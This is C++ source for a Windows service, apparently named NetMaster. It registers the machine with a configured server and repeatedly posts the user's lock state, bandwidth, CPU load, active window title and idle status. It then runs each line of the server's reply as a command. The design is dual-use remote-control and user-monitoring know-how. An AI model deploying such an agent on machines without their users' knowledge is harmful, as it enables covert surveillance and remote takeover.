#include"Globals.h"
#include"Net.h"
#include"service.h"
#include"Strings.h"
#include"Http.h"
#include"Command.h"
#include"Conf.h"
#include"Monitor.h"
#include"IPC.h"
#include"Utils.h"
#include"Conf.h"

std::string postupdate;
std::string postinit;

std::string UpdateStatus() {

	double bandsent = 0, bandrec = 0, cpuload = 0;

	Mon::CheckBandwidth(bandrec, bandsent);
	cpuload = Mon::CpuCurrentLoad();
	//IPC::pData->windowTitle;
	std::string locked;
	if (Mon::IsSessionLocked()) {
		locked = "1";
	}
	else {
		locked = "0";
	}

	std::string bandsentstr = std::to_string(bandsent);
	std::string bandrecstr = std::to_string(bandrec);
	std::string cpuloadstr = std::to_string(cpuload);
	std::string wt = Strings::wtostr(IPC::pData->windowTitle);
	std::string idle(1,IPC::pData->idle);

	
	int size = snprintf(NULL, 0,postupdate.c_str(), Config::guid,locked.c_str(),bandrecstr.c_str(),bandsentstr.c_str(),cpuloadstr.c_str(),wt.c_str(),idle.c_str());
	char* buff = new char[size + 1];
	sprintf_s(buff, size + 1,postupdate.c_str(), Config::guid, locked.c_str(), bandrecstr.c_str(), bandsentstr.c_str(), cpuloadstr.c_str(), wt.c_str(), idle.c_str());
	
	std::string endpoint("/" + Config::path + "/userupdate.php");
	std::string response=Http::HttpPost(Config::host.c_str(), buff, endpoint.c_str());
	delete[] buff;
	return response;

}

void AddClient() {
	//id name
	Sleep(1000);
	memcpy_s(Config::username, sizeof(Config::username), IPC::pData->username, sizeof(IPC::pData->username));
	wcscpy_s(Config::fullname, Config::username);
	wcscat_s(Config::fullname, L"@");
	wcscat_s(Config::fullname, Config::name);
	std::string endpoint("/"+Config::path+"/userinit.php");

	//
	std::string fullnamea = Strings::wtostr(Config::fullname);
	


	int size = snprintf(NULL, 0, postinit.c_str(), Config::guid,fullnamea.c_str());
	char* buff = new char[size + 1];
	sprintf_s(buff, size + 1, postinit.c_str(), Config::guid, fullnamea.c_str());

	Http::HttpPost(Config::host.c_str(), buff,endpoint.c_str());
	delete[] buff;

}
void _stdcall _Main() {
	if (_wchdir(L"C:\\ProgramData\\NetMaster")) {
		Log::SaveLog((wchar_t*)L"Error changing Directory");
	}
	if (!Net::init()) {
		Log::SaveLog((wchar_t*)L"Error NETInit");
		SetEvent(g_ServiceStopEvent); return;
	}
	Strings::StringsInit();
	Log::LogInit();
	Mon::initMon();
	//parse config
	if (!Config::parseConfig()) {
		SetEvent(g_ServiceStopEvent);
		return;
	}

	if (IPC::serviceIPCinit()) {
		Utils::runAsUser(Config::currentpath, (wchar_t*)L" userproc",FALSE,TRUE);
	}
	else {
		Log::SaveLog((wchar_t*)L"Error IPCInit");
		SetEvent(g_ServiceStopEvent);
		return;
	}

	if (!Http::HttpInit()) { Log::SaveLog((wchar_t*)L"Error Http init"); Utils::CleanUp(); SetEvent(g_ServiceStopEvent); return; }
	std::string response;
	//
	postupdate =Strings::GetStr("updatepost");
	postinit= Strings::GetStr("postinit");
	//add
	AddClient();
	while (1) {
		//update status
		response=UpdateStatus();
		if(response.size()>0){
		//new command
			auto e = Utils::splitLines(response,'\n');
			for(int i=0;i<e.size();i++){ new command(e[i]); }
			
		
		}
		
		Sleep(Config::Updatefreq);

	}
	



}